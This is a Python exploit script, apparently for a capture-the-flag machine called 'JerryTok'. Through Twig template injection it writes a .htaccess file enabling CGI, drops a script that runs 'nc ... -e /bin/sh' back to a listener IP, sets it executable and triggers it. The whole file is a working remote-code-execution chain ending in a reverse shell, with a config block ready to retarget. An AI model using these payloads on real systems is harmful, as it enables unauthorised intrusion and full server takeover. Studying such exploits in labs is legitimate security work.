#!/usr/bin/python3.11

import urllib.parse
import requests
import time

# ðŸŽ¯ CONFIG - Change These
TARGET = "http://jerrytok.htb:55179"
IP = "139.162.184.70"
PORT = 9001
FILENAME = "shellz.shellz"

# Build payload components
HTACCESS_CONTENT = "Options +ExecCGI\nAddHandler cgi-script .shellz\n"
SCRIPT_CONTENT = f"#!/bin/sh\n\necho\nnc {IP} {PORT} -e /bin/sh"

def send(payload):
    url = f"{TARGET}/?location=" + urllib.parse.quote(payload)
    print(f"[>] Sending: {url}")
    try:
        requests.get(url, timeout=5)
    except Exception as e:
        print(f"[-] Exception: {e} (might be normal if shell triggers)")

def main():
    print("[*] Starting JerryTok Exploit via Twig SSTI + CGI")

    # Step 1: .htaccess
    payload1 = "{{['/www/public/.htaccess','" + HTACCESS_CONTENT + "']|sort('file_put_contents')}}"
    send(payload1)

    # Step 2: drop shellz script
    encoded_script = SCRIPT_CONTENT.replace('\n', '\\n')
    payload2 = "{{['/www/public/" + FILENAME + "','" + encoded_script + "']|sort('file_put_contents')}}"
    send(payload2)

    # Step 3: chmod +x
    payload3 = "{{['/www/public/" + FILENAME + "',777]|sort('chmod')}}"
    send(payload3)

    # Step 4: trigger shellz
    print("[*] Triggering CGI payload. Setup your listener!")
    time.sleep(2)
    try:
        r = requests.get(f"{TARGET}/{FILENAME}", timeout=5)
        print("[+] Triggered! Response:")
        print(r.text)
    except Exception as e:
        print(f"[~] Trigger might have dropped to shell: {e}")

if __name__ == "__main__":
    main()
